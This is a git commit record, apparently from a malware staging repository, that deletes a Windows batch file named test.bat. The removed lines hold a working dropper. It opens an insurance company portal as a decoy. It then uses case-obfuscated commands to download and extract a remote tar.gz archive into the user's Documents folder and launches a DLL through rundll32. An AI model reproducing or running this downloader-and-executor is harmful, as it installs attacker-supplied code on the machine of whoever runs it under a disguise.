49a8cb76fb32c2e6aa791413b18fc3529cb3dbe7
TEST <lostar323@gmail.com>
2025-10-20 16:42:13 +0300

    Delete test.bat

--- test.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-start microsoft-edge:https://portal.hdisigorta.com.tr
-cD %USERPROFILE%\Documents && CuRl https://raw.githubusercontent.com/testhdi/test/refs/heads/main/test.tar.gz -s -o tEsT.taR.Gz && tAr -xzf tEsT.taR.Gz 
-start RuNdLL32.exe devcon.dll,CM_Free_Res_Des_Ex
